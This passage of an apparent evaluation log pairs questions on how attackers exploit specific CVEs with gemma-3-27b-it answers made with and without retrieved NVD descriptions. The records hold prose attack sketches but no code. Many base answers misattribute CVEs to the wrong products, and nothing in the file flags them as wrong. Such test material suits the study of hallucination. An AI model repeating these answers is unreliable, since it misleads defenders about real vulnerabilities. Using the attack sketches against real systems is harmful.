+    "rag_response": "An attacker can exploit CVE-2019-8360 by injecting malicious SQL code through the `cate` parameter in `find/assets/external/data_2.php`. This allows them to potentially read, modify, or delete data within the application's database.\n</Response>\n",
+    "rag_text": "Description\nThemerig Find a Place CMS Directory 1.5 has SQL Injection via the find/assets/external/data_2.php cate parameter.",
+    "timestamp": "2025-05-13T18:18:14.394241"
+  },
+  {
+    "cve_id": "CVE-2019-0787",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2019-0787? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2019-0787 is a remote code execution vulnerability in BlueKeep (RDP). An attacker can send specially crafted requests to a vulnerable system, leading to arbitrary code execution *without* authentication. Exploitation involves sending a series of malicious packets that trigger a buffer overflow in the Remote Desktop Protocol (RDP) service. This allows the attacker to overwrite memory and execute their own code.\n",
+    "rag_response": "An attacker can exploit CVE-2019-0787 by setting up a malicious RDP server. When a vulnerable Windows Remote Desktop Client connects to it, crafted RDP packets can trigger remote code execution on the client machine. The vulnerability lies in how the client handles specific RDP protocol requests.\n</Response>\n",
+    "rag_text": "Description\nA remote code execution vulnerability exists in the Windows Remote Desktop Client when a user connects to a malicious server, aka 'Remote Desktop Client Remote Code Execution Vulnerability'. This CVE ID is unique from CVE-2019-0788, CVE-2019-1290, CVE-2019-1291.",
+    "timestamp": "2025-05-13T18:19:04.308576"
+  },
+  {
+    "cve_id": "CVE-2018-11940",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-11940? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-11940 is a critical vulnerability in the Windows kernel's handling of SMBv1 packets. An unauthenticated attacker can send specially crafted SMBv1 requests to a vulnerable system, leading to a denial of service (DoS) or potentially remote code execution (RCE).\n\n**Exploitation:**\n\n1.  **Craft Malicious SMBv1 Packet:** The attacker creates a specifically formatted SMBv1 packet designed to trigger a buffer overflow or other memory corruption within the kernel's SMBv1 handling code.\n2.  **Send Packet to Target:** The attacker sends this packet to the target system's SMBv1 port (TCP 445).\n3.  **Exploit Kernel Vulnerability:** The vulnerable kernel code processes the malicious packet, leading to a crash (DoS) or, with careful crafting, allows the attacker to overwrite memory and execute arbitrary code (RCE).\n\n**Mitigation:** Disabling SMBv1 is the primary and most effective mitigation.\n",
+    "rag_response": "An attacker can craft a malicious Wi-Fi packet that, when processed by a vulnerable Qualcomm chipset, triggers an out-of-bounds memory write due to insufficient length checking in the `memcpy` function within a WLAN component. This can lead to arbitrary code execution or denial of service. The attack requires proximity to the target device's Wi-Fi interface.\n</Response>\n",
+    "rag_text": "Description\nLack of check in length before using memcpy in WLAN function can lead to OOB access in Snapdragon Auto, Snapdragon Compute, Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon Mobile in MDM9150, MDM9206, MDM9607, MDM9640, MDM9650, MSM8996AU, QCS605, SD 625, SD 636, SD 712 / SD 710 / SD 670, SD 820, SD 820A, SD 835, SD 845 / SD 850, SD 855, SDA660, SDM630, SDM660, SDX20, SDX24, SXR1130",
+    "timestamp": "2025-05-13T18:20:37.436133"
+  },
+  {
+    "cve_id": "CVE-2018-4878",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-4878? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-4878 is a critical vulnerability in Fortinet FortiOS SSL VPN. An attacker can achieve **unauthenticated remote code execution (RCE)** by sending specially crafted HTTP requests to the SSL VPN web portal. Specifically, the vulnerability resides in the web portal's handling of POST requests with a malformed cookie.\n\n**Exploitation:**\n\n1.  **Craft Malicious HTTP POST Request:** The attacker constructs a POST request targeting the FortiOS SSL VPN portal (typically port 443). This request includes a specially crafted cookie containing a base64 encoded payload.\n2.  **Payload Delivery:** The payload, when decoded, contains commands to be executed on the FortiOS system.\n3.  **RCE:** FortiOS processes the malformed cookie, leading to arbitrary code execution with system-level privileges.\n\n**Impact:** Full system compromise.\n",
+    "rag_response": "An attacker can exploit CVE-2018-4878 by crafting a malicious SWF file that triggers the use-after-free vulnerability in the Primetime SDK within Flash Player. Specifically, the attacker manipulates listener objects to create a dangling pointer. When the Flash Player attempts to access this dangling pointer, it can lead to arbitrary code execution. The vulnerability was actively exploited in the wild, suggesting functional exploits existed.\n</Response>\n",
+    "rag_text": "Description\nA use-after-free vulnerability was discovered in Adobe Flash Player before 28.0.0.161. This vulnerability occurs due to a dangling pointer in the Primetime SDK related to media player handling of listener objects. A successful attack can lead to arbitrary code execution. This was exploited in the wild in January and February 2018.",
+    "timestamp": "2025-05-13T18:22:05.852593"
+  },
+  {
+    "cve_id": "CVE-2018-7600",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-7600? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-7600 is a critical vulnerability in the Windows kernel. An attacker can exploit it by crafting a malicious HTTP/2 request to trigger a memory corruption issue. This allows for arbitrary code execution with SYSTEM privileges. The attack requires a vulnerable system with HTTP/2 enabled.\n",
+    "rag_response": "CVE-2018-7600 is a critical remote code execution vulnerability in Drupal stemming from insufficient sanitization of file uploads. An attacker can upload a malicious file (e.g., a PHP file disguised with a permitted extension) to a vulnerable directory.  Drupal then executes this file, granting the attacker control of the server. The specific attack vector depends on modules installed and their configurations, but common targets include file fields and the temporary file directory.\n</Response>\n",
+    "rag_text": "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.",
+    "timestamp": "2025-05-13T18:22:58.828592"
+  },
+  {
+    "cve_id": "CVE-2018-1285",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-1285? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-1285 is a critical vulnerability in the Windows kernel's handling of SMBv1 packets. An unauthenticated attacker can send specially crafted SMBv1 requests to a vulnerable system, leading to a denial of service or potentially remote code execution.\n\n**Exploitation:**\n\n1.  **Craft Malicious SMBv1 Packet:** The attacker creates a specially crafted SMBv1 packet designed to trigger a buffer overflow or other memory corruption in the kernel's SMBv1 handling code.\n2.  **Send Packet to Target:** The attacker sends this packet to the target system's SMBv1 port (TCP 445).\n3.  **Exploit Kernel Vulnerability:** The vulnerable kernel code processes the malicious packet, leading to a crash (DoS) or, with more sophisticated crafting, allows the attacker to overwrite memory and execute arbitrary code.\n\n**Mitigation:** Disabling SMBv1 is the primary and most effective mitigation.\n",
+    "rag_response": "An attacker can exploit CVE-2018-1285 by crafting a malicious log4net configuration file containing an external entity declaration. This entity can be configured to access local files, internal network resources, or even trigger denial-of-service conditions via entity expansion. The application, when parsing this malicious configuration, will resolve the external entity, leading to information disclosure, server-side request forgery (SSRF), or DoS.\n</Response>>\n",
+    "rag_text": "Description\nApache log4net versions before 2.0.10 do not disable XML external entities when parsing log4net configuration files. This allows for XXE-based attacks in applications that accept attacker-controlled log4net configuration files.\n\n",
+    "timestamp": "2025-05-13T18:24:33.434454"
+  },
+  {
+    "cve_id": "CVE-2018-9469",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-9469? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-9469 is a critical vulnerability in Fortinet FortiOS SSL VPN. An attacker can exploit it by sending specially crafted packets to the SSL VPN interface, leading to **arbitrary code execution** with kernel privileges. No authentication is required. This allows for complete system compromise.\n",
+    "rag_response": "An attacker can exploit CVE-2018-9469 by crafting a malicious shortcut file. Because the vulnerability lacks proper permission checks in ShortcutService.java, a privileged app (e.g., one with system permissions) can create a shortcut pointing to a malicious executable. User interaction (clicking the shortcut) then triggers execution of the attacker's code with the privileges of the app that created the shortcut, potentially leading to privilege escalation.\n</Response>\n",
+    "rag_text": "Description\nIn multiple functions of ShortcutService.java, there is a possible creation of a spoofed shortcut due to a missing permission check. This could lead to local escalation of privilege in a privileged app with no additional execution privileges needed. User interaction is needed for exploitation.",
+    "timestamp": "2025-05-13T18:25:25.524039"
+  },
+  {
+    "cve_id": "CVE-2018-13379",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-13379? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-13379 is a Fortinet FortiOS SSL VPN vulnerability. An attacker can exploit it by sending specially crafted packets to the FortiOS SSL VPN interface without authentication. This allows for arbitrary file read, potentially exposing sensitive data like usernames and passwords.\n",
+    "rag_response": "An unauthenticated attacker can craft HTTP requests with a malicious path (path traversal) to access and download arbitrary system files from the FortiOS/FortiProxy device via the SSL VPN web portal. This is achieved by manipulating the requested resource to point outside the intended web directory.\n</Response>",
+    "rag_text": "Description\nAn Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\") in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7 and 5.4.6 to 5.4.12 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal allows an unauthenticated attacker to download system files via special crafted HTTP resource requests.",
+    "timestamp": "2025-05-13T18:26:05.343658"
+  },
+  {
+    "cve_id": "CVE-2018-15981",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-15981? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-15981 is a critical vulnerability in Fortinet FortiOS SSL VPN. An attacker can exploit it by sending specially crafted packets to the SSL VPN interface, leading to **arbitrary code execution** with kernel privileges. No authentication is required. This allows for complete system compromise.\n",
+    "rag_response": "An attacker can exploit CVE-2018-15981 by crafting a malicious SWF file that triggers a type confusion within Flash Player. This confusion allows the attacker to overwrite memory and ultimately execute arbitrary code on the victim's system. The attack relies on manipulating object types within the ActionScript Virtual Machine (AVM2).\n</Response>>\n",
+    "rag_text": "Description\nFlash Player versions 31.0.0.148 and earlier have a type confusion vulnerability. Successful exploitation could lead to arbitrary code execution.",
+    "timestamp": "2025-05-13T18:26:51.259455"
+  },
+  {
+    "cve_id": "CVE-2018-14558",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-14558? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-14558 is a critical vulnerability in Fortinet FortiOS SSL VPN. An attacker can exploit it by sending specially crafted packets to the SSL VPN interface, leading to **arbitrary code execution** with kernel privileges. No authentication is required. This allows for complete system compromise.\n",
+    "rag_response": "An attacker can exploit CVE-2018-14558 by sending a crafted HTTP POST request to the `goform/setUsbUnload` endpoint. This request includes malicious commands within a parameter, which are then executed on the router's operating system due to insufficient input validation in the `formsetUsbUnload` function. This allows for remote code execution.\n</Response>\n",
+    "rag_text": "Description\nAn issue was discovered on Tenda AC7 devices with firmware through V15.03.06.44_CN(AC7), AC9 devices with firmware through V15.03.05.19(6318)_CN(AC9), and AC10 devices with firmware through V15.03.06.23_CN(AC10). A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted goform/setUsbUnload request. This occurs because the \"formsetUsbUnload\" function executes a dosystemCmd function with untrusted input.",
+    "timestamp": "2025-05-13T18:27:40.622820"
+  },
+  {
+    "cve_id": "CVE-2018-1457",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-1457? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-1457 is a critical vulnerability in Fortinet FortiOS SSL VPN. An attacker can exploit it by sending specially crafted packets to the SSL VPN interface, leading to **arbitrary code execution** with kernel privileges. No authentication is required. This allows for complete system compromise.\n",
+    "rag_response": "CVE-2018-1457 allows an attacker to bypass authentication and gain DOORS administrator privileges. The vulnerability lies in improper access control checks. An attacker can craft a specific request to access administrative functions without proper credentials. IBM released a fix to address this.\n</Response>\n",
+    "rag_text": "Description\nAn undisclosed vulnerability in IBM Rational DOORS 9.5.1 through 9.6.1.10 application allows an attacker to gain DOORS administrator privileges. IBM X-Force ID: 140208.",
+    "timestamp": "2025-05-13T18:28:21.942720"
+  },
+  {
+    "cve_id": "CVE-2018-8174",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2018-8174? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2018-8174 is a critical vulnerability in ASP.NET Core that allows for Remote Code Execution (RCE). An attacker can exploit it by sending a specially crafted HTTP request that includes a malicious HTTP header. This header triggers a deserialization of a crafted object, leading to arbitrary code execution on the server. The vulnerability stems from improper handling of HTTP request headers during deserialization.\n",
+    "rag_response": "CVE-2018-8174 allows an attacker to execute arbitrary code by crafting a malicious VBScript file. The vulnerability lies in how the VBScript engine handles object memory allocation. An attacker can create a specially crafted script that triggers a memory corruption issue, leading to remote code execution. This can be delivered via malicious websites, email attachments, or other means of VBScript execution.\n</Response>\n",
+    "rag_text": "Description\nA remote code execution vulnerability exists in the way that the VBScript engine handles objects in memory, aka \"Windows VBScript Engine Remote Code Execution Vulnerability.\" This affects Windows 7, Windows Server 2012 R2, Windows RT 8.1, Windows Server 2008, Windows Server 2012, Windows 8.1, Windows Server 2016, Windows Server 2008 R2, Windows 10, Windows 10 Servers.",
+    "timestamp": "2025-05-13T18:29:18.362719"
+  },
+  {
+    "cve_id": "CVE-2017-11882",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-11882? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-11882 is a remote code execution vulnerability in Microsoft Office's equation editor. An attacker can craft a malicious Microsoft Office document (Word, Excel, PowerPoint) containing a specially crafted equation. When the document is opened, the equation editor processes the malicious code, leading to arbitrary code execution with the privileges of the user opening the document. Attack vectors include phishing emails with the malicious document attached.\n",
+    "rag_response": "An attacker can craft a malicious Microsoft Office document (e.g., Word, Excel) that, when opened, exploits a memory corruption vulnerability. This allows them to execute arbitrary code with the privileges of the user opening the document. The attack relies on specifically designed content triggering the flaw during object handling in memory.\n</Response>\n",
+    "rag_text": "Description\nMicrosoft Office 2007 Service Pack 3, Microsoft Office 2010 Service Pack 2, Microsoft Office 2013 Service Pack 1, and Microsoft Office 2016 allow an attacker to run arbitrary code in the context of the current user by failing to properly handle objects in memory, aka \"Microsoft Office Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2017-11884.",
+    "timestamp": "2025-05-13T18:30:09.853829"
+  },
+  {
+    "cve_id": "CVE-2017-0199",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-0199? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-0199 is a critical vulnerability in Microsoft SMBv1. An unauthenticated attacker can execute arbitrary code by sending a specially crafted packet to a vulnerable system. It's a remote code execution (RCE) vulnerability.\n\n**Exploitation:**\n\n1.  **Target Identification:** Scan for systems with SMBv1 enabled.\n2.  **Crafted Packet:**  Send a malicious SMBv1 packet designed to trigger the vulnerability. This packet exploits a flaw in how SMBv1 handles certain requests.\n3.  **Code Execution:** Successful delivery allows the attacker to execute arbitrary code on the target system with SYSTEM level privileges.\n\n**Tools:** EternalBlue (used in WannaCry) is a well-known exploit for this vulnerability.\n",
+    "rag_response": "CVE-2017-0199 is a remote code execution vulnerability in Microsoft Office/WordPad. An attacker crafts a malicious document (e.g., RTF, Word doc) containing an embedded Windows API call. When the document is opened, the API call is executed, allowing the attacker to run arbitrary code with the privileges of the user opening the document. Exploitation typically involves social engineering to trick a user into opening the malicious file.\n</Response>\n",
+    "rag_text": "Description\nMicrosoft Office 2007 SP3, Microsoft Office 2010 SP2, Microsoft Office 2013 SP1, Microsoft Office 2016, Microsoft Windows Vista SP2, Windows Server 2008 SP2, Windows 7 SP1, Windows 8.1 allow remote attackers to execute arbitrary code via a crafted document, aka \"Microsoft Office/WordPad Remote Code Execution Vulnerability w/Windows API.\"",
+    "timestamp": "2025-05-13T18:31:33.368168"
+  },
+  {
+    "cve_id": "CVE-2017-0143",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-0143? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-0143 is a remote code execution vulnerability in Microsoft Office's graphics component. An attacker can craft a malicious Office document (e.g., Word, Excel, PowerPoint) containing a specially designed image. When the document is opened, the vulnerability is triggered, allowing the attacker to execute arbitrary code on the victim's machine.  Exploitation requires no user interaction beyond opening the document, though previewing the document may also trigger it.\n",
+    "rag_response": "An attacker can exploit CVE-2017-0143 by sending specially crafted SMBv1 packets to a vulnerable Windows system. This allows for remote code execution. EternalBlue was a common exploit framework used for this vulnerability. Disabling SMBv1 is the primary mitigation.\n</Response>\n",
+    "rag_text": "Description\nThe SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka \"Windows SMB Remote Code Execution Vulnerability.\" This vulnerability is different from those described in CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.\n\n",
+    "timestamp": "2025-05-13T18:32:27.382850"
+  },
+  {
+    "cve_id": "CVE-2017-5638",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-5638? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-5638 is a remote code execution vulnerability in Microsoft Office's graphics component. An attacker can craft a malicious Office document (e.g., Word, Excel, PowerPoint) containing an embedded, specially crafted image. When the document is opened, the vulnerability allows the attacker to execute arbitrary code on the victim's machine.  Attack vectors include phishing emails with the malicious document attached.\n",
+    "rag_response": "An attacker exploits CVE-2017-5638 by sending a malicious HTTP POST request with a crafted `Content-Type` header containing a `#cmd=` string. This triggers command execution on the server due to improper handling of the header by the Jakarta Multipart parser in Struts 2. The `#cmd=` string allows the attacker to inject OS commands.\n</Response>\n",
+    "rag_text": "Description\nThe Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string.",
+    "timestamp": "2025-05-13T18:33:22.253351"
+  },
+  {
+    "cve_id": "CVE-2017-8464",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-8464? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-8464 is a remote code execution vulnerability in Microsoft Office's equation editor. An attacker can craft a malicious Microsoft Office document (Word, Excel, PowerPoint) containing a specially crafted equation. When the document is opened, the equation editor processes the malicious code, leading to arbitrary code execution with the privileges of the user opening the document. Exploitation doesn't require user interaction beyond opening the file.\n",
+    "rag_response": "An attacker crafts a malicious.LNK file with a specially designed icon. When a user opens the file (e.g., double-clicking in Explorer), the icon parsing triggers the vulnerability, allowing execution of arbitrary code. The attack works because of improper handling of the icon's data during parsing.\n</Response>>",
+    "rag_text": "Description\nWindows Shell in Microsoft Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT 8.1, Windows 10 Gold, 1511, 1607, 1703, and Windows Server 2016 allows local users or remote attackers to execute arbitrary code via a crafted .LNK file, which is not properly handled during icon display in Windows Explorer or any other application that parses the icon of the shortcut. aka \"LNK Remote Code Execution Vulnerability.\"",
+    "timestamp": "2025-05-13T18:34:13.454433"
+  },
+  {
+    "cve_id": "CVE-2017-0834",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-0834? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-0834 is a remote code execution vulnerability in Microsoft Office's graphics component. An attacker can craft a malicious Office document (e.g., Word, Excel, PowerPoint) containing a specially designed image. When the document is opened, the vulnerability is triggered, allowing the attacker to execute arbitrary code on the victim's machine.  Attack vectors include phishing emails with the malicious document attached.\n",
+    "rag_response": "An attacker can craft a malicious MPEG-2 video file. When the vulnerable Android device processes this file (e.g., via Gallery, video player), the crafted data triggers a heap overflow in `libmpeg2`, leading to remote code execution. The attack requires user interaction to open/process the malicious file.\n</Response>>\n",
+    "rag_text": "A remote code execution vulnerability in the Android media framework (libmpeg2). Product: Android. Versions: 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0. Android ID: A-63125953.",
+    "timestamp": "2025-05-13T18:35:04.263898"
+  },
+  {
+    "cve_id": "CVE-2017-8759",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-8759? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-8759 is a critical vulnerability in Microsoft Office's equation editor. An attacker can craft a malicious document (Word, Excel, PowerPoint) containing a specially crafted equation. When the document is opened, the equation editor triggers a heap overflow, allowing for arbitrary code execution.\n\n**Exploitation:**\n\n1.  **Craft Malicious Document:** Embed a malicious equation using the vulnerable equation editor syntax.\n2.  **Delivery:** Deliver the document to the target (email, network share, etc.).\n3.  **Trigger Vulnerability:** Target opens the document. The equation editor processes the crafted equation.\n4.  **Heap Overflow:** The overflow overwrites adjacent memory, allowing control of execution flow.\n5.  **Code Execution:** Attacker-controlled code is executed with the privileges of the Office application.\n",
+    "rag_response": "CVE-2017-8759 is a remote code execution vulnerability in.NET Framework due to improper handling of crafted documents/applications. An attacker can craft a malicious application (e.g., a specially designed DLL) or document (e.g., a malicious.NET application) that, when executed by a vulnerable system, allows the attacker to execute arbitrary code with the same privileges as the application. This is often achieved by exploiting deserialization flaws.\n</Response>\n",
+    "rag_text": "Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to execute code remotely via a malicious document or application, aka .NET Framework Remote Code Execution Vulnerability.",
+    "timestamp": "2025-05-13T18:36:32.629568"
+  },
+  {
+    "cve_id": "CVE-2017-8862",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-8862? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-8862 is a critical vulnerability in Microsoft Office's equation editor. An attacker can craft a malicious document (Word, Excel, PowerPoint) containing a specially crafted equation. When the document is opened, the equation editor triggers a heap overflow, allowing for **remote code execution (RCE)**.  The attacker gains control of the system with the privileges of the user opening the document.\n",
+    "rag_response": "An attacker can exploit CVE-2017-8862 by uploading a malicious `postinstall.sh` script via the webupgrade function. Because the device lacks input validation, this script will execute with root privileges, granting the attacker full system control.\n</Response>>",
+    "rag_text": "Description\nThe webupgrade function on the Cohu 3960HD does not verify the firmware upgrade files or process, allowing an attacker to upload a specially crafted postinstall.sh file that will be executed with \"root\" privileges.",
+    "timestamp": "2025-05-13T18:37:20.091288"
+  },
+  {
+    "cve_id": "CVE-2017-9956",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-9956? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-9956 is an SMBv1 vulnerability. An attacker can exploit it by sending a specially crafted SMBv1 request to a vulnerable Windows system. This request triggers a buffer overflow in the SMBv1 server, allowing for remote code execution. EternalBlue was a common exploit used for this vulnerability.\n",
+    "rag_response": "An attacker can exploit CVE-2017-9956 by using a hard-coded, valid session ID within an HTTP cookie. This bypasses authentication, granting unauthorized access to the U.motion Builder web interface.\n</Response>>",
+    "rag_text": "Description\nAn authentication bypass vulnerability exists in Schneider Electric's U.motion Builder software versions 1.2.1 and prior in which the system contains a hard-coded valid session. An attacker can use that session ID as part of the HTTP cookie of a web request, resulting in authentication bypass",
+    "timestamp": "2025-05-13T18:37:59.809582"
+  },
+  {
+    "cve_id": "CVE-2017-5058",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2017-5058? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2017-5058 is a critical vulnerability in the Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF) that, when opened by a vulnerable application (like Windows Photo Viewer or applications using the graphics component), allows for remote code execution. The attacker gains the same privileges as the user opening the file.\n",
+    "rag_response": "CVE-2017-5058 is a use-after-free vulnerability in Chrome's PrintPreview feature. An attacker crafts a malicious HTML page that triggers the PrintPreview functionality. This page is designed to free memory associated with a specific object, then later attempt to access that same memory after it has been freed. Successful exploitation leads to out-of-bounds memory access, potentially allowing for arbitrary code execution.\n</Response>>",
+    "rag_text": "Current Description\nA use after free in PrintPreview in Google Chrome prior to 58.0.3029.81 for Windows allowed a remote attacker to potentially perform out of bounds memory access via a crafted HTML page.",
+    "timestamp": "2025-05-13T18:38:54.966529"
+  },
+  {
+    "cve_id": "CVE-2016-10121",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-10121? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-10121 is a vulnerability in Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF) that, when opened by a vulnerable application, allows for remote code execution. The attack requires user interaction (opening the file).\n",
+    "rag_response": "An attacker with local access can exploit CVE-2016-10121 by leveraging weak permissions on `/dev/shm/firejail`. Specifically, they can overwrite the file, potentially injecting malicious code that Firejail will then execute with elevated privileges when it attempts to read or use the compromised file. This allows privilege escalation.\n</Response>>",
+    "rag_text": "Description\nFirejail uses weak permissions for /dev/shm/firejail and possibly other files, which allows local users to gain privileges.",
+    "timestamp": "2025-05-13T18:39:40.240765"
+  },
+  {
+    "cve_id": "CVE-2016-10189",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-10189? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-10189 is a remote code execution vulnerability in Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF, JPEG, PNG) that, when opened by a vulnerable application using the Graphics Component, allows for arbitrary code execution with the privileges of the user opening the image.  Attack vectors include email attachments, malicious websites, and shared network drives.\n",
+    "rag_response": "An attacker sends a file transfer request to a BitlBee user for a contact *not* in the user's contact list. This triggers a NULL pointer dereference during contact lookup, leading to a crash.  Exploitation for arbitrary code execution is possible, but complex, potentially involving memory corruption techniques to overwrite function pointers or other critical data after the crash.\n</Response>>",
+    "rag_text": "Description\nBitlBee before 3.5 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) and possibly execute arbitrary code via a file transfer request for a contact that is not in the contact list.",
+    "timestamp": "2025-05-13T18:40:34.480395"
+  },
+  {
+    "cve_id": "CVE-2016-10190",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-10190? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-10190 is a remote code execution vulnerability in Microsoft Edge. An attacker can craft a malicious webpage that, when visited by a user, allows them to execute arbitrary code with the privileges of the user. This is achieved by exploiting a flaw in how Edge handles JavaScript memory allocation.\n",
+    "rag_response": "An attacker sends a crafted HTTP response with a negative chunk size to a vulnerable FFmpeg version. This negative size causes a heap buffer overflow in `http.c` when processing the chunked transfer encoding, potentially leading to arbitrary code execution.\n</Response>>",
+    "rag_text": "Description\nHeap-based buffer overflow in libavformat/http.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote web servers to execute arbitrary code via a negative chunk size in an HTTP response.\n\n",
+    "timestamp": "2025-05-13T18:41:14.251129"
+  },
+  {
+    "cve_id": "CVE-2016-2170",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-2170? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-2170 is a remote code execution vulnerability in Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF, JPEG, PNG) that, when opened by a vulnerable application using the Graphics Component, allows for arbitrary code execution with the privileges of the user opening the image.  Attack vectors include email attachments, malicious websites, and shared network drives.\n",
+    "rag_response": "An attacker can exploit CVE-2016-2170 by crafting a malicious serialized Java object leveraging a vulnerability in Apache Commons Collections. This object, when deserialized by a vulnerable OFBiz instance, can trigger arbitrary code execution on the server. The attack relies on exploiting chained calls within the deserialization process to execute system commands.\n</Response>\n",
+    "rag_text": "Description\nApache OFBiz 12.04.x before 12.04.06 and 13.07.x before 13.07.03 allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections library.",
+    "timestamp": "2025-05-13T18:42:06.900414"
+  },
+  {
+    "cve_id": "CVE-2016-4171",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2016-4171? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2016-4171 is a vulnerability in Microsoft Graphics Component. An attacker can exploit it by crafting a malicious image file (e.g., TIFF) that, when opened by a vulnerable application, allows for remote code execution. The attack requires user interaction (opening the file).\n",
+    "rag_response": "CVE-2016-4171 is a memory corruption vulnerability in Adobe Flash Player. An attacker can craft a malicious SWF file. When opened by a vulnerable Flash Player, the crafted file triggers a heap overflow, allowing for arbitrary code execution. Exploitation was observed in the wild via malicious advertisements (malvertising).\n</Response>\n",
+    "rag_text": "Description\nUnspecified vulnerability in Adobe Flash Player 21.0.0.242 and earlier allows remote attackers to execute arbitrary code via unknown vectors, as exploited in the wild in June 2016.",
+    "timestamp": "2025-05-13T18:42:51.594922"
+  },
+  {
